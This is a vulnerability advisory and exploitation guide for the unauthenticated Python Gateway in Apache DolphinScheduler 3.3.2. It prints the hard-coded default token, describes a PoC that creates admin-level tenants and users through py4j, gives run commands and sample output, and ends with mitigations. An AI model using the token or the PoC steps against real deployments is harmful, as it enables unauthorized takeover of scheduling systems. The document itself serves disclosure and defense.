# Apache DolphinScheduler Python Gateway Unauthenticated Access Vulnerability Analysis & Exploitation Guide

## Vulnerability Overview 

In the default deployment of Apache DolphinScheduler 3.3.2 (especially the standalone image), the `application.yaml` enables the Python Gateway service (`enabled: true`), binds it to `0.0.0.0`, and ships with a fixed authentication token `jwUDzpLsNKEFER4*a8gruBH_GsAurNxU7A@Xc`. Any attacker who can reach this port can reuse the token to invoke all management interfaces provided by the Python Gateway.

Internally, the gateway executes every operation as the built-in `dummyAdminUser` (administrator privileges). Hence the attacker can create tenants, users, projects, workflows, and other sensitive resources at will, ultimately taking full control of the scheduling system. This is a critical authentication and authorization flaw.

## Affected Scope

- Default DolphinScheduler standalone container or deployments using the official configuration.
- The gateway listens on `0.0.0.0` without any source IP restrictions.
- The gateway still uses the default token and remains enabled.

## Technical Details

1. Default configuration located at `dolphinscheduler-standalone-server/src/main/resources/application.yaml`:
   ```yaml
   python-gateway:
     enabled: true
     auth-token: jwUDzpLsNKEFER4*a8gruBH_GsAurNxU7A@Xc
     gateway-server-address: 0.0.0.0
     gateway-server-port: 25333
   ```
2. As long as the auth token is non-empty, `PythonGateway` accepts incoming connections and delegates every request to various services as `dummyAdminUser`.
3. An attacker only needs the service address to connect with a `py4j` client and perform arbitrary management actions. The PoC demonstrates impact by creating a tenant/user pair and logging into the web UI with the freshly created account.

## PoC Script

The script `vul/python_gateway_poc.py` automates the verification steps:
- Accept the target URL, automatically derive the web endpoint (assuming Python Gateway and web UI reside on the same host).
- Connect to the Python Gateway with the default token.
- Create tenant `eviltenant001` and user `eviluser001/Passw0rd!` (skip if already present).
- Call `/dolphinscheduler/login` to confirm that the newly created account can access the web UI.

## Usage

### 1. Install Dependencies

The PoC requires `py4j`:
```bash
pip install py4j
```

### 2. Run the PoC

Provide the web entry URL (with scheme and port):
```bash
python3 python_gateway_poc.py http://url:port
```

You should observe output similar to:
```
[+] Created/loaded tenant id=...
[+] Created/loaded user id=...
[+] HTTP login response status=200
[+] Body: {"code":0,"msg":"login success", ...}
[+] Login succeeded, vulnerability confirmed
```
Otherwise, the script reports the failure reason (unable to connect, token modified, etc.).

### 3. Optional Parameters

The script supports the following optional arguments (`--help` for the full list):
- `--gateway-port`: Python Gateway port (default 25333).
- `--auth-token`: Authentication token for the gateway (defaults to the official value).
- `--tenant-code`, `--queue-name`, `--username`, `--password`, etc. to customize created resources.

Example:
```bash
python3 python_gateway_poc.py http://10.0.0.5:12345 \
  --auth-token CustomToken \
  --gateway-port 30000 \
  --username demoUser \
  --password StrongPass1!
```

## Mitigation Recommendations

1. Disable the Python Gateway if not required:
   ```yaml
   python-gateway:
     enabled: false
   ```
2. If the gateway must stay enabled:
   - Change `auth-token` to a strong, random value and store it securely.
   - Bind `gateway-server-address` to `127.0.0.1` or an internal interface only.
   - Restrict access via firewall/ACL.
3. Remove any PoC-created tenants/users (`eviltenant001`, `eviluser001`).
4. Encourage upstream to warn or fail startup when the default token is used, and to introduce finer-grained gateway access control.
